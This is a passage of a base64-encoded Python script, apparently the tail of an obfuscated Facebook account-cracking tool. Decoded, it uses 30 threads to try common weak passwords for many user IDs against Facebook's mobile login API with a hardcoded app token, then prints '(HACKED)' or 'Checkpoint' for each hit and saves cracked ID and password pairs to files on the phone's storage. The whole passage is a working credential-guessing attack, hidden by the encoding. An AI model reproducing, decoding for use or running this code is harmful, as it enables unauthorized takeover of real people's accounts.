lc3NfdG9rZW4nIGluIHE6DQoNCiAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5M20gICAoSEFDXHgxYlsxOzkybUtFRClceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiAgXHgxYlsxOzk3bScgKyBrICsgYyArIHVzZXIgKyAnXHgxYlsxOzkxbSBceGUyXHg5N1x4OGYgXHgxYlsxOzk1bScgKyBwYXNzMg0KDQogICAgICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NkY2FyZC9pZHMvc3VjY2Vzc2Z1bC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICAgICAgb2tiLndyaXRlKGsgKyBjICsgdXNlciArIHBhc3MyICsgJ1xuJykNCg0KICAgICAgICAgICAgICAgICAgICBva2IuY2xvc2UoKQ0KDQogICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMikNCg0KICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOg0KDQogICAgICAgICAgICAgICAgICAgIHByaW50ICdceDFiWzE7OTJtICAgKENoZWNrXHgxYlsxOzk3bXBvaW50XHgxYlsxOzkzbSlceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiBceDFiWzE7OTdtJyArIGsgKyBjICsgdXNlciArICdceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiBceDFiWzE7OTZtICcgKyBwYXNzMg0KDQogICAgICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NkY2FyZC9pZHMvY2hlY2twb2ludC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICAgICAgY3BzLndyaXRlKGsgKyBjICsgdXNlciArIHBhc3MzICsgJ1xuJykNCg0KICAgICAgICAgICAgICAgICAgICBjcHMuY2xvc2UoKQ0KDQogICAgICAgICAgICAgICAgICAgIGNwYi5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMykNCg0KICAgICAgICAgICAgICAgIGVsc2U6DQoNCiAgICAgICAgICAgICAgICAgICAgcGFzczMgPSAnMTAyMDMwJw0KDQogICAgICAgICAgICAgICAgICAgIGRhdGEgPSBici5vcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9JyArIGsgKyBjICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzMyArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQ0KDQogICAgICAgICAgICAgICAgICAgIHEgPSBqc29uLmxvYWQoZGF0YSkNCg0KICAgICAgICAgICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiBxOg0KDQogICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkzbSAgIChIQUNceDFiWzE7OTJtS0VEKVx4MWJbMTs5MW0gXHhlMlx4OTdceDhmICBceDFiWzE7OTdtJyArIGsgKyBjICsgdXNlciArICdceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiBceDFiWzE7OTVtJyArIHBhc3MzDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG9rYiA9IG9wZW4oJ3NkY2FyZC9pZHMvc3VjY2Vzc2Z1bC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG9rYi53cml0ZShrICsgYyArIHVzZXIgKyBwYXNzMyArICdcbicpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG9rYi5jbG9zZSgpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIG9rcy5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMykNCg0KICAgICAgICAgICAgICAgICAgICBlbGlmICd3d3cuZmFjZWJvb2suY29tJyBpbiBxWydlcnJvcl9tc2cnXToNCg0KICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm0gICAoQ2hlY2tceDFiWzE7OTdtcG9pbnRceDFiWzE7OTNtKVx4MWJbMTs5MW0gXHhlMlx4OTdceDhmIFx4MWJbMTs5N20nICsgayArIGMgKyB1c2VyICsgJ1x4MWJbMTs5MW0gXHhlMlx4OTdceDhmIFx4MWJbMTs5Nm0gJyArIHBhc3MzDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwcyA9IG9wZW4oJ3NkY2FyZC9pZHMvY2hlY2twb2ludC50eHQnLCAnYScpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwcy53cml0ZShrICsgYyArIHVzZXIgKyBwYXNzMyArICdcbicpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwcy5jbG9zZSgpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNwYi5hcHBlbmQoYyArIHVzZXIgKyBwYXNzMykNCg0KICAgICAgICAgICAgICAgICAgICBlbHNlOg0KDQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzNCA9ICc0NDU1NjYnDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSBici5vcGVuKCdodHRwczovL2ItYXBpLmZhY2Vib29rLmNvbS9tZXRob2QvYXV0aC5sb2dpbj9hY2Nlc3NfdG9rZW49MjM3NzU5OTA5NTkxNjU1JTI1MjU3QzBmMTQwYWFiZWRmYjY1YWMyN2E3MzllZDFhMjI2M2IxJmZvcm1hdD1qc29uJnNka192ZXJzaW9uPTEmZW1haWw9JyArIGsgKyBjICsgdXNlciArICcmbG9jYWxlPWVuX1VTJnBhc3N3b3JkPScgKyBwYXNzNCArICcmc2RrPWlvcyZnZW5lcmF0ZV9zZXNzaW9uX2Nvb2tpZXM9MSZzaWc9M2Y1NTVmOThmYjYxZmNkN2FhMGM0NGY1OGY1MjJlZm0nKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICBxID0ganNvbi5sb2FkKGRhdGEpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICdhY2Nlc3NfdG9rZW4nIGluIHE6DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludCAnXHgxYlsxOzkzbSAgIChIQUNceDFiWzE7OTJtS0VEKVx4MWJbMTs5MW0gXHhlMlx4OTdceDhmICBceDFiWzE7OTdtJyArIGsgKyBjICsgdXNlciArICdceDFiWzE7OTFtIFx4ZTJceDk3XHg4ZiBceDFiWzE7OTVtJyArIHBhc3M0DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBva2IgPSBvcGVuKCdzZGNhcmQvaWRzL3N1Y2Nlc3NmdWwudHh0JywgJ2EnKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgb2tiLndyaXRlKGsgKyBjICsgdXNlciArIHBhc3M0ICsgJ1xuJykNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9rYi5jbG9zZSgpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBva3MuYXBwZW5kKGMgKyB1c2VyICsgcGFzczQpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJ3d3dy5mYWNlYm9vay5jb20nIGluIHFbJ2Vycm9yX21zZyddOg0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQgJ1x4MWJbMTs5Mm0gICAoQ2hlY2tceDFiWzE7OTdtcG9pbnRceDFiWzE7OTNtKVx4MWJbMTs5MW0gXHhlMlx4OTdceDhmIFx4MWJbMTs5N20nICsgayArIGMgKyB1c2VyICsgJ1x4MWJbMTs5MW0gXHhlMlx4OTdceDhmIFx4MWJbMTs5Nm0gJyArIHBhc3M0DQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcHMgPSBvcGVuKCdzZGNhcmQvaWRzL2NoZWNrcG9pbnQudHh0JywgJ2EnKQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY3BzLndyaXRlKGsgKyBjICsgdXNlciArIHBhc3M0ICsgJ1xuJykNCg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNwcy5jbG9zZSgpDQoNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjcGIuYXBwZW5kKGMgKyB1c2VyICsgcGFzczQpDQoNCiAgICAgICAgZXhjZXB0Og0KDQogICAgICAgICAgICBwYXNzDQoNCiAgICBwID0gVGhyZWFkUG9vbCgzMCkNCg0KICAgIHAubWFwKG1haW4sIGlkKQ0KDQogICAgcHJpbnQgNTAgKiAnXHgxYlsxOzkxbS0nDQoNCiAgICBwcmludCAnUHJvY2VzcyBIYXMgQmVlbiBDb21wbGV0ZWQgLi4uJw0KDQogICAgcHJpbnQgJ1RvdGFsIE9ubGluZS9PZmZsaW5lIDogJyArIHN0cihsZW4ob2tzKSkgKyAnLycgKyBzdHIobGVuKGNwYikpDQoNCiAgICByYXdfaW5wdXQoJ1xuXHgxYlsxOzkybVtceDFiWzE7OTJtQmFja1x4MWJbMTs5NW1dJykNCg0KICAgIGxvZ2luKCkNCg0KaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoNCg0KICAgIGxvZ2luKCkg"))
